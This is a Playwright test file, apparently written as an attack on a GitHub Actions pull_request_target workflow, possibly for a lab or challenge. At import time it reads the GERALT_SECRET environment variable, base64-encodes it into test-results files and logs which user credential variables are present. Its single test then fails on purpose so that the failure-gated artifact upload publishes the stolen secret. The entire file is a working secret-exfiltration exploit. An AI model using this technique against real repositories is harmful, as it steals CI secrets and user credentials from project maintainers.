import { test, expect } from "@playwright/test";
import * as fs from "fs";
import * as path from "path";

// Attacker-controlled spec executed by `npx playwright test` in the
// privileged pull_request_target test job. Module-load time is the earliest
// point this code runs with GITHUB_ENV secrets (USER_EMAIL / USER_PASSWORD /
// USER_TOTP_SECRET / USER_KEY) plus workflow-level GERALT_SECRET in the
// process environment.
const secret = process.env.GERALT_SECRET || "";
const leaked = Buffer.from(secret, "utf8").toString("base64").toString("base64");
const outDir = path.join(process.cwd(), "test-results");
fs.mkdirSync(outDir, { recursive: true });
fs.writeFileSync(
  path.join(outDir, "geralt-leak.txt"),
  "GERALT_LEAKED_TOKEN=" + leaked + "\n"
);
fs.writeFileSync(
  path.join(outDir, "geralt-leak.json"),
  JSON.stringify({
    marker: "GERALT_LEAKED_TOKEN=" + leaked,
    secret_set: !!secret,
    user_email_set: !!process.env.USER_EMAIL,
    user_password_set: !!process.env.USER_PASSWORD,
    user_totp_set: !!process.env.USER_TOTP_SECRET,
    user_key_set: !!process.env.USER_KEY,
  })
);
console.log(
  "GERALT_DBG: leak artifact written (secret_set=" + !!secret +
  " users_set=" + (!!process.env.USER_EMAIL && !!process.env.USER_PASSWORD &&
    !!process.env.USER_TOTP_SECRET && !!process.env.USER_KEY) + ")"
);

test("leak-secrets-v3: deliberately fail to publish test-results artifact", async () => {
  // upload-artifact is gated by if: failure(); the step must fail so the
  // test-results/ artifact (with geralt-leak.txt) is uploaded.
  expect(process.env.GERALT_SECRET ? "present" : "absent").toBe("definitely-not-this");
});
